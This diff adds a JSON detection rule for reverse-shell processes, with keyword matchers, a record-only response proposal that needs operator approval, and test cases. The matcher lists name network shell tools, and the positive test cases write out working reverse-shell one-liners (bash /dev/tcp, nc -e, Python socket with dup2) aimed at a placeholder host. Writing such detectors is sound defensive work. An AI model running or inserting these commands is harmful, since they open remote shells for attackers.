@@ -1,0 +1,173 @@
+{
+  "package_version": 1,
+  "rule_id": "SATSUMA-AI-REVERSE_SHELL_PROC",
+  "rule_version": 1,
+  "detection": {
+    "schema_version": 1,
+    "id": "SATSUMA-AI-REVERSE_SHELL_PROC",
+    "name": "Reverse shell via shell interpreter with network redirection or remote-exec one-liner",
+    "severity": "high",
+    "classification": "likely",
+    "confidence": "medium",
+    "implementation_status": "CURRENT_TELEMETRY",
+    "proof_level": "PUBLIC_RESEARCH",
+    "base_match": {
+      "source": "sys_proc",
+      "cmd_contains": [
+        "bash -i",
+        "sh -i",
+        "nc -e",
+        "ncat -e",
+        "socat exec",
+        "python -c",
+        "perl -e",
+        "php -r",
+        "ruby -e"
+      ],
+      "cmd_arg_contains": [
+        "/dev/tcp/",
+        "/dev/udp/",
+        "socket.socket",
+        "IO::Socket",
+        "fsockopen",
+        "TCPSocket",
+        "pty.spawn",
+        "dup2"
+      ]
+    },
+    "actions": [
+      "record",
+      "evidence",
+      "correlation_request"
+    ],
+    "category": "reverse_shell",
+    "dedup_group": "reverse_shell_proc",
+    "mitre": {
+      "tactic": "TA0011",
+      "technique": "T1059"
+    },
+    "context": {
+      "note": "Advisory detection only; matchers are exact program-name-plus-ordered-arguments for cmd_contains and free argument substring for cmd_arg_contains. Anonymous/JIT/memfd observations alone do not establish malware."
+    },
+    "false_positives": [
+      "Legitimate admin scripts using socat or nc for testing",
+      "Developer debugging with python -c socket code",
+      "Automated provisioning tools embedding /dev/tcp checks"
+    ],
+    "references": [
+      "https://attack.mitre.org/techniques/T1059/"
+    ]
+  },
+  "response_proposal": {
+    "schema_version": 1,
+    "rule_id": "SATSUMA-AI-REVERSE_SHELL_PROC",
+    "rule_version": 1,
+    "requested_action": "record",
+    "target_type": "none",
+    "execution": "requires_policy_authorization",
+    "evidence_required": true,
+    "operator_review": true,
+    "conditions": [
+      "Confirm the process command line matches a shell interpreter with network redirection or remote-exec one-liner",
+      "Correlate with a fresh independent record for the same target before any intervention",
+      "Verify the parent process context to exclude sanctioned administrative tooling",
+      "Check whether the destination address is internal or external and expected"
+    ],
+    "impact": "No automated intervention; advisory record and evidence collection only. Any containment would require separate operator authorization.",
+    "rollback": "Not applicable for record-only action; no state is changed.",
+    "minimum_sources": 2,
+    "required_sources": [
+      "sys_proc",
+      "network"
+    ],
+    "verification_level": "fresh_independent_same_target_records",
+    "policy_preconditions": [
+      "operator_authorization",
+      "existing_response_policy",
+      "target_identity",
+      "protected_target_exemptions"
+    ],
+    "detection_sha256": "4a05a66e83211489e27a6fd1f6a358f5e2f389e9a23e63d19e468426ec4b6bc5"
+  },
+  "test_cases": {
+    "positive": [
+      {
+        "source": "sys_proc",
+        "cmd": "bash -i >& /dev/tcp/203.0.113.10/4444 0>&1",
+        "exe": "/bin/bash",
+        "parent_cmd": "sh -c bash -i",
+        "pid": 4242,
+        "ppid": 4200,
+        "uid": 1000,
+        "timestamp": 1700000000
+      },
+      {
+        "source": "sys_proc",
+        "cmd": "nc -e /bin/sh 203.0.113.10 4444",
+        "exe": "/usr/bin/nc",
+        "pid": 4243,
+        "ppid": 4200,
+        "uid": 1000,
+        "timestamp": 1700000001
+      },
+      {
+        "source": "sys_proc",
+        "cmd": "python -c import socket,subprocess,os;s=socket.socket();s.connect(('203.0.113.10',4444));os.dup2(s.fileno(),0)",
+        "exe": "/usr/bin/python3",
+        "pid": 4244,
+        "ppid": 4200,
+        "uid": 1000,
+        "timestamp": 1700000002
+      }
+    ],
+    "negative": [
+      {
+        "source": "sys_proc",
+        "cmd": "bash -i",
+        "exe": "/bin/bash",
+        "pid": 4300,
+        "ppid": 4299,
+        "uid": 1000,
+        "timestamp": 1700000010
+      },
+      {
+        "source": "sys_proc",
+        "cmd": "nc -l 8080",
+        "exe": "/usr/bin/nc",
+        "pid": 4301,
+        "ppid": 4299,
+        "uid": 1000,
+        "timestamp": 1700000011
+      },
+      {
+        "source": "sys_proc",
+        "cmd": "python -c print('hello')",
+        "exe": "/usr/bin/python3",
+        "pid": 4302,
+        "ppid": 4299,
+        "uid": 1000,
+        "timestamp": 1700000012
+      }
+    ],
+    "wrong_source": [
+      {
+        "source": "memory",
+        "action": "anonymous_rwx",
+        "pid": 4400,
+        "timestamp": 1700000020
+      },
+      {
+        "source": "memory",
+        "action": "memfd_executable",
+        "pid": 4401,
+        "timestamp": 1700000021
+      },
+      {
+        "source": "memory",
+        "action": "deleted_executable",
+        "pid": 4402,
+        "timestamp": 1700000022
+      }
+    ]
+  }
+}
